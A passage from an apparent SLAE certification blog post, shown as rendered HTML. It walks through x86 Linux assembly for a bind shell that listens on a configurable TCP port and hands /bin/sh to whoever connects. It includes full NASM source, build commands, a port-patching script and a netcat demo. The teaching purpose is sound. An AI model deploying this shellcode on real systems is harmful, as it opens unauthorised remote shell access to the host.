    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; put client socketfd (returned in eax) to ebx</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; make eax zero</span>
    
    <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>    <span class="c">; Zero out ecx</span>
    <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mh">0x03</span>    <span class="c">; Start value for counter</span>
<span class="n">dup2</span><span class="o">:</span>
    <span class="k">dec</span> <span class="n">ecx</span>         <span class="c">; decrese ecx</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3f</span>    <span class="c">; syscall for dup2</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>
    <span class="k">jnz</span> <span class="n">dup2</span>        <span class="c">; If ecx i not zero, next iteration</span>
</code></pre>
</div>

<h2 id="execve">Execve</h2>
<p>Finally, we execute the “Execve”-syscall</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; EXECVE</span>
    <span class="c">; Setup execve</span>
    <span class="c">; execve ("/bin/sh", NULL, NULL)</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; Zero eax</span>
    <span class="k">push</span> <span class="n">eax</span>        <span class="c">; push 0 used as a terminator</span>
    <span class="k">push</span> <span class="mh">0x68732f6e</span> <span class="c">; hs/n in hex</span>
    <span class="k">push</span> <span class="mh">0x69622f2f</span> <span class="c">; ib//  in hex</span>

    <span class="c">; Set up ebx for syscall</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put address to //bin/sh0x0 in ebx</span>
    <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>    <span class="c">; Put a zero in ecx</span>
    <span class="k">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>    <span class="c">; Put a zero in edx</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xb</span>     <span class="c">; Syscall for execve</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>
</code></pre>
</div>

<p>The full code is as follows:</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; Bind shell in nasm</span>
<span class="c">; Author: rtmcx</span>
<span class="c">; </span>

<span class="kr">global</span> <span class="n">_start</span>

<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
<span class="n">_start</span><span class="o">:</span>

<span class="c">; The following actions must be performed:</span>
<span class="c">; Create a socket</span>
<span class="c">; Bind the socket</span>
<span class="c">; Listen for connection</span>
<span class="c">; Accept a connection</span>
<span class="c">; Copy socket to stdio, stdout, stderr</span>
<span class="c">; Execve /bin/sh</span>

<span class="c">; Socket functions are used by the socketcall syscall</span>
<span class="c">; int socketcall(int call, unsigned long *args);</span>

<span class="c">; socketcall = 102 (0x66) </span>
<span class="c">; /usr/include/linux/net.h </span>
<span class="c">; Socket =1     </span>
<span class="c">; Bind = 2</span>
<span class="c">; Listen = 4</span>
<span class="c">; Accept = 5             </span>


    <span class="c">; Create a socket using socketcall</span>
    <span class="c">; sockfd = socket(int socket_family, int socket_type, int protocol);</span>
    <span class="c">; eax = 0x66    (socketcall syscall)</span>
    <span class="c">; ebx = 1 (Bind) </span>
    <span class="c">; ecx = args for bind</span>
<span class="c">; SOCKET    </span>
    <span class="k">push</span> <span class="mh">0x66</span>       <span class="c">; Syscall for socketcall</span>
    <span class="k">pop</span> <span class="n">eax</span>         <span class="c">; in eax</span>

    <span class="k">push</span> <span class="mh">0x1</span>        <span class="c">; Socketcall-number for socket</span>
    <span class="k">pop</span> <span class="n">ebx</span>         <span class="c">; Put in ebx</span>
        
    <span class="c">; Set up the args for socket</span>
    <span class="c">; cat /usr/include/linux/in.h </span>
    <span class="c">; PUSH protocol, type and domain</span>
    <span class="c">; Protocol: TCP=0, Type: SOCK_STREAM = 1, Domain: INET = 2</span>
    <span class="k">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>    <span class="c">; Make edi null</span>
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; This is 'Protocol' TCP = 0</span>
    <span class="k">push</span> <span class="n">ebx</span>        <span class="c">; ebx already has 1 in it, reuse for Type</span>
    <span class="k">push</span> <span class="n">byte</span> <span class="mh">0x8002</span><span class="c">; Inet = 2.</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put 'pointer' to args in ecx (args to socketcall)</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; execute syscall. </span>

    <span class="c">; Now we have a socketfd in eax</span>
    <span class="k">xchg</span> <span class="n">esi</span><span class="p">,</span> <span class="n">eax</span>   <span class="c">; Save socketfd in esi (as we need it later on)</span>


<span class="c">; BIND</span>
    <span class="c">; Set up args for 'Bind'</span>
    <span class="c">;   int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</span>
    
    <span class="c">; ebx = socketfd (esi)</span>
    <span class="c">; ecx = args for bind (struct sockaddr) </span>
    <span class="c">; edx length of the args</span>
    
    <span class="c">; Setup the sockaddr, push the values to the stack</span>
    <span class="c">; sockaddr (2, 9999, 0)</span>
    <span class="c">; ADDR_FAMILY = 0, PORT = 9999, AF_INET = 2</span>
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; edi is still 0    (ADDR_FAMILY ALL)</span>
    <span class="k">push</span> <span class="n">word</span> <span class="mh">0x0f27</span><span class="c">; Port 9999 in hex network byte order (0x0f27)</span>
    <span class="k">push</span> <span class="n">word</span> <span class="mh">0x02</span>  <span class="c">; (AF_INET)</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to args in ecx, for use with "bind" call  </span>
    
    <span class="k">inc</span> <span class="n">bl</span>          <span class="c">; inc ebx to 2, for 'Bind'-socketcall number</span>
    <span class="k">push</span> <span class="mh">0x10</span>       <span class="c">; Size of the sockaddr struct (16 bytes)</span>
    <span class="k">push</span> <span class="n">ecx</span>        <span class="c">; Argv for bind</span>
    <span class="k">push</span> <span class="n">esi</span>        <span class="c">; esi has the socketfd in it</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to 'Bind'-args in ecx</span>
    
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; zero out eax </span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span>    <span class="c">; syscall for socketcall</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>

    
<span class="c">; LISTEN</span>
    <span class="c">; Setup args for 'Listen' </span>
    <span class="c">; listen(socketfd, backlog)</span>

    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; Make eax null</span>
    <span class="k">push</span> <span class="n">eax</span>        <span class="c">; push 0</span>
    <span class="k">push</span> <span class="n">esi</span>        <span class="c">; esi has the socketfd in it </span>
    
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to 'Listen'-args</span>
    <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x4</span>     <span class="c">; Syscall for listen</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span>    <span class="c">; syscall for socketcall</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>


<span class="c">; ACCEPT</span>
    <span class="c">; Setup args for 'Accept'</span>
    <span class="c">; accept( socketfd, struct sockaddr, sizeof sockaddr)</span>
    <span class="c">; Since we know nothing of the client, sockaddr and it's size is set to 0   </span>
    
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; edi is still 0 (ADDR_FAMILY ALL)</span>
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; </span>
    <span class="k">push</span> <span class="n">esi</span>        <span class="c">; esi has the socketfd in it </span>

    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; struct for sockaddr (client)</span>
    <span class="k">inc</span> <span class="n">bl</span>          <span class="c">; ebx has 4 since 'listen' call. Inc to make 5 for accept</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span>    <span class="c">; syscall for socketcall</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>


<span class="c">; DUP2</span>
    <span class="c">; Now we need to dup2 i/o-to client socketfd</span>
    <span class="c">; dup2(oldfd, newfd)</span>
    
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; put client socketfd (returned in eax) to ebx</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; make eax zero</span>
    
    <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>    <span class="c">; Zero out ecx</span>
    <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mh">0x03</span>    <span class="c">; Start value for counter</span>
<span class="n">dup2</span><span class="o">:</span>
    <span class="k">dec</span> <span class="n">ecx</span>         <span class="c">; decrese ecx</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3f</span>    <span class="c">; syscall for dup2</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>
    <span class="k">jnz</span> <span class="n">dup2</span>        <span class="c">; If ecx i not zero, next iteration</span>


<span class="c">; EXECVE</span>
    <span class="c">; Setup execve</span>
    <span class="c">; execve ("/bin/sh", NULL, NULL)</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; Zero eax</span>
    <span class="k">push</span> <span class="n">eax</span>        <span class="c">; push 0 used as a terminator</span>
    <span class="k">push</span> <span class="mh">0x68732f6e</span> <span class="c">; hs/n in hex</span>
    <span class="k">push</span> <span class="mh">0x69622f2f</span> <span class="c">; ib//  in hex</span>

    <span class="c">; Set up ebx for syscall</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put address to //bin/sh0x0 in ebx</span>
    <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>    <span class="c">; Put a zero in ecx</span>
    <span class="k">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>    <span class="c">; Put a zero in edx</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xb</span>     <span class="c">; Syscall for execve</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>
</code></pre>
</div>

<p>Compile and link the program:</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>
rtmcx@parrot <span class="nv">$ </span>nasm -f elf32 <span class="nb">bind</span>-shell.nasm -o <span class="nb">bind</span>-shell.o
rtmcx@parrot <span class="nv">$ </span>ld -m elf_i386 <span class="nb">bind</span>-shell.o -o <span class="nb">bind</span>-shell
</code></pre>
</div>

<p>To avoid doing this every time, I extended the script that Vivek wrote in the course. The script compiles, links, extracts the shellcode, create a shellcode c-program generator and compiles it.</p>

<p>The script can be found in the Github-repo for the SLAE assignments: <a href="https://github.com/rtmcx/SLAE">https://github.com/rtmcx/SLAE</a>.</p>

<h2 id="replace-port-number">Replace port number</h2>
<p>After the bind-shell is complete, next up is to complete the requirrement “Port number should be easily conﬁgurable”.
The easiest way to change the port number is using a script that takes a port number, converts it into hex and reverse the byte order.
The portnumber bytes is then replaced in the shellcode.</p>

<p>Instead of creating a new, separate script to performs these tasks, I decided to include them into the compiler script. 
The port number is then feed into the script as an commandline argument:</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>./compile.sh <span class="nb">bind</span>-shell 1337
<span class="o">[</span><span class="k">***</span><span class="o">]</span> Compiling with nasm...
<span class="o">[</span><span class="k">***</span><span class="o">]</span> Linking with ld...
<span class="o">[</span>---] Replacing the port to 1337
</code></pre>
</div>

<p>To be able to do this dynamicly, we need to replace the port number-push in the shellcode with “marker bytes”, so that we can find the correct place in the shellcode. 
this is done in the ‘Bind’-call:</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>    <span class="c">; Set up args for 'Bind'</span>
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; edi is still 0    (ADDR_FAMILY ALL)</span>
    <span class="k">push</span> <span class="n">word</span> <span class="mh">0xaaaa</span><span class="c">; Marker bytes for compile script</span>
    <span class="k">push</span> <span class="n">word</span> <span class="mh">0x02</span>  <span class="c">; (AF_INET)</span>
    <span class="p">...</span>
</code></pre>
</div>

<h3 id="script">script</h3>

<p>I wont go over the entire script in this post, as the script is commented and self-explanatory, but the actual replacement is done like this:</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>shellcode <span class="o">=</span> 
<span class="nv">porthex</span><span class="o">=</span><span class="se">\\</span>x<span class="nv">$lb</span><span class="se">\\</span>x<span class="nv">$hb</span>
<span class="nv">marker</span><span class="o">=</span><span class="s2">"</span><span class="se">\\\x</span><span class="s2">aa</span><span class="se">\\\x</span><span class="s2">aa"</span>

<span class="nb">echo</span> <span class="s2">"[---] Replacing the port to </span><span class="nv">$port</span><span class="s2">"</span>
<span class="nv">shellcode</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">shellcode</span><span class="p">/</span><span class="nv">$marker</span><span class="p">/</span><span class="nv">$porthex</span><span class="k">}</span><span class="s2">"</span>
</code></pre>
</div>

<p>Execute the generated shellcode-wrapper and connect to the specified port with netcat:</p>
<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>./shellcode-bind-shell 1337
Shellcode length: 102
</code></pre>
</div>
<p>(in another terminal:)</p>
<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>nc localhost 1337
<span class="nb">pwd</span> 
/home/rtmcx
ls
Desktop
Downloads
shellcode-bind-shell
</code></pre>
</div>
<p>It works!</p>

<p>All code and scripts can be found in the repository: <a href="https://github.com/rtmcx/SLAE">https://github.com/rtmcx/SLAE</a>.</p>

<hr />

<p>This blog post has been created for completing the requirements of the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert certification</a>.</p>

<p>Student ID: PA-0726</p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
      <div class="entry-image-index">
        <a href="https://rtmcx.github.io/SLAE/" title="SLAE"><img src="https://rtmcx.github.io/images/SLAE_logo2.jpg" alt="SLAE"></a>
      </div><!-- /.entry-image -->
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2017-03-22T00:00:00+00:00"><a href="https://rtmcx.github.io/SLAE/">March 22, 2017</a></time></span><span class="author vcard"><span class="fn"><a href="https://rtmcx.github.io/about/" title="About rtmcx">rtmcx</a></span></span>
      
      <span class="entry-reading-time">
        <i class="fa fa-clock-o"></i>
        
Reading time ~1 minute
      </span><!-- /.entry-reading-time -->
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="https://rtmcx.github.io/SLAE/" rel="bookmark" title="SLAE" itemprop="url">SLAE</a></h1>
    
  </header>
  <div class="entry-content">
    <p>SLAE (short for SecurityTube Linux Assembly Expert) is a online based self phased training in assembly on Linux.</p>

<p>From the web page: 
“The SecurityTube Linux Assembly Expert (SLAE) is an online course and certification which focuses on teaching the basics of 32-bit assembly language for the Intel Architecture (IA-32) family of processors on the Linux platform and applying it to Infosec. “</p>

<p>This page will serve as a index page where all assignments for the course will be placed.</p>

<p>The course is available at <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->



<div class="pagination">
  <ul class="inline-list">
    
    
      
        <li><a href="https://rtmcx.github.io" class="btn">Previous</a></li>
      
    

    
    
      <li><a href="https://rtmcx.github.io">1</a></li>
    

    
    

    
    
    

    

    
    

    
      <li><strong class="current-page">2</strong></li>
    

    
    
  </ul>
</div>


</div><!-- /#main -->

<div class="footer-wrapper">
  <footer role="contentinfo">
    <span>&copy; 2017 rtmcx. Powered by <a href="http://jekyllrb.com" rel="nofollow">Jekyll</a> using the <a href="https://mademistakes.com/work/hpstr-jekyll-theme/" rel="nofollow">HPSTR Theme</a>.</span>
  </footer>
</div><!-- /.footer-wrapper -->

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script>window.jQuery || document.write('<script src="https://rtmcx.github.io/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
<script src="https://rtmcx.github.io/assets/js/scripts.min.js"></script>



          

</body>
</html>